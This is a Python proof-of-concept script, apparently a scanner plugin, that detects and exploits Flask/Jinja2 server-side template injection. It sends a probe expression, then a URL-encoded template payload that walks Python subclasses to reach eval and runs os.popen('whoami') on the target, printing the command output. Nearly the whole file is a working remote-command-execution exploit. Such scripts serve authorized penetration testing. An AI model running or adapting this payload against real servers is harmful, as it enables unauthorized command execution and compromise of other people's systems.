#!/usr/bin/env python3

'''
name: Falsk SSTI漏洞
description: Falsk SSTI注入漏洞,可执行任意命令
'''

from app.lib.utils.request import request

class Ssti_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        }
        self.check_payload = '?name={{233*233}}'
        self.cmd_payload = '''?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22whoami%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D'''
    
    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            check_req = request.get(self.url + self.check_payload, headers = self.headers)
            if check_req.text == 'Hello 54289' and check_req.status_code == 200:
                print('存在Flask SSTI漏洞,执行whoami命令结果为:')
                cmd_req = request.get(self.url + self.cmd_payload, headers = self.headers)
                print(cmd_req.text.replace('\n', ''))
                return True
            else:
                print('不存在Flask SSTI漏洞')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if __name__ == '__main__':
    SSTI = Ssti_BaseVerify('http://192.168.30.242:8000')
    SSTI.run()
